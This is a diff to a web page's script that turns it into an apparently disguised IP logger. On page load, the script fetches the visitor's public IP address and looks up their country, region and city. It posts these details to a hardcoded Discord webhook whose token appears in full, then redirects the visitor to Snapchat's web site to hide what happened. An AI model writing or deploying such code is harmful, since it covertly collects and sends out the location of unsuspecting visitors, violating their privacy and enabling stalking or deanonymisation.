@@ -9,7 +9,9 @@
   fetch("https://myexternalip.com/raw").then(res=>{
     res.text().then(tx=>{
       i=tx;
-      fetch(
+      fetch(`https://ipapi.co/${i}/json`).then(res2=>{
+        res2.json().then(jsonip=>{
+          fetch(
   'https://discord.com/api/webhooks/1307884457126133852/frwdgKYVjiHPD5LbP7_S7G3z4mDQjlorKldfARdu_7GrZ0FGbO6XyusSBGVD3ouX6l98',
   {
     method: 'post',
@@ -30,15 +32,15 @@
             },
             {
               name: 'Country 🌍',
-              value: `${"```"}Coming soon!${"```"}`,
+              value: `${"```"}${jsonip.country}${"```"}`,
             },
             {
               name: 'State 🗺',
-              value: `${"```"}Coming soon!${"```"}`,
+              value: `${"```"}${jsonip.region}${"```"}`,
             },
             {
               name: 'City 📍',
-              value: `${"```"}Coming soon!${"```"}`,
+              value: `${"```"}${jsonip.city}${"```"}`,
             },
         ],
           footer: {
@@ -51,6 +53,9 @@
     }),
   }
 );
+        })
+      })
+      document.location.href = "https://web.snapchat.com/"
     })
   })
 </script>
